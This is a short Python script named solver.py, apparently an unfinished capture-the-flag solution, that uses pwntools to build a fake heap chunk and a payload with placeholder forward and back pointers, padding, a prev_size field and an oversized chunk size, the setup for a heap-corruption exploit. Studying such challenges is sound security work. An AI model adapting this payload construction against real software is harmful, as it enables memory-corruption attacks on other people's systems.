#!/usr/bin/env python3
"""
solver.py
"""
from pwn import *

fake_chunk = flat(
    '\x33' * 8,
    '\x44' * 8,
)

payload = "<test>"
payload += "\x33" * 8  # fd ptr
payload += "\x44" * 8  # bck ptr
payload += "\xAA" * 48 # padding
payload += "\xBB" * 8 # prev_size
payload += "\xF0" + "\xFF" * 7 # chunk 2 size

